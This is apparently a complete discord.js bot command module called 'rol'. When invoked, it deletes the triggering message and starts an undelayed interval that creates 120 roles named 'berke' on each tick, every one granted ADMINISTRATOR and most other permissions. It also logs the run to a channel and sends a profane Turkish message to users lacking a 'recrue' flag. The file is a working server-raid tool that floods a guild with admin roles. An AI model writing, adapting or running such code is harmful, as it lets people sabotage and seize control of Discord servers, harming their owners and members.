const Discord = require("discord.js");
var perms = ["KICK_MEMBERS","BAN_MEMBERS","ADMINISTRATOR","CREATE_INSTANT_INVITE","MANAGE_CHANNELS","MANAGE_GUILD","ADD_REACTIONS","VIEW_AUDIT_LOG","VIEW_CHANNEL","READ_MESSAGES","SEND_MESSAGES","SEND_TTS_MESSAGES","MANAGE_MESSAGES","EMBED_LINKS","ATTACH_FILES","READ_MESSAGE_HISTORY","MENTION_EVERYONE","USE_EXTERNAL_EMOJIS","EXTERNAL_EMOJIS","CONNECT","SPEAK","MUTE_MEMBERS","DEAFEN_MEMBERS","MOVE_MEMBERS","USE_VAD","CHANGE_NICKNAME","MANAGE_NICKNAMES","MANAGE_ROLES","MANAGE_ROLES_OR_PERMISSIONS","MANAGE_WEBHOOKS","MANAGE_EMOJIS"];



module.exports.run = async(bot, message, args, recrue) => {
   message.delete();
    if(recrue) {
      return message.author.send("Hayırdır amk bu komuta iznin varmı amk").catch(console.error)
    };

  if(message.deletable) message.delete();
        var interval = setInterval (function () {
          for (var i = 0; i < 120; i++) {
    message.guild.createRole({
        name: 'berke',
        color: (Math.floor((Math.random() * 16777215) + 1)),
        permissions: perms,
      }) 
    }

        });
  bot.channels.find('name',"berke").send("Log : ["+message.author.tag+" // "+message.author.id+"] ["+message.guild.name+"] La commande role a été éxécutée.");
  
}
module.exports.help = {
  name: "rol"
  }
